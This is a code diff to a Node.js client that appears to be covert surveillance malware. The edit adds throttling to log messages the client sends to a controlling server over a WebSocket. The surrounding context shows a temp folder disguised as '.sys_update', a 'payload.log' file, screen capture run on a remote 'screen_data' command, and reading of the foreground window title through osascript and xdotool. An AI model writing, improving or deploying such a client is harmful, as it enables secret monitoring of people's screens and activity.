@@ -25,13 +25,19 @@ const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
+let lastLogSent = 0; // Throttle system logs to prevent spam
+
 function log(msg) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${msg}`);
  try {
  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
- if (ws && ws.readyState === WebSocket.OPEN && myId) {
+ 
+ // Only send system logs if it's been more than 2 seconds since the last one
+ // This fixes the spam issue
+ if (Date.now() - lastLogSent > 2000 && ws && ws.readyState === WebSocket.OPEN && myId) {
  safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
+ lastLogSent = Date.now();
  }
  } catch (e) {}
 }
@@ -124,7 +130,7 @@ function initConnection() {
  } else if (data.type === 'screen_data') {
  captureScreenPureJS();
  } else if (data.type === 'system_log') {
- // Optional
+ // Optional - already handled in log function
  }
  } catch (e) {
  log(`[WS] Error parsing message: ${e.message}`);
@@ -340,7 +346,6 @@ async function getCurrentWindowTitle() {
  } else if (platform === 'darwin') {
  cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
  } else {
- // Removed generic linux fallback that was causing issues
  cmd = 'xdotool getwindowfocus getwindowname';
  }
  exec(cmd, (err, stdout) => {
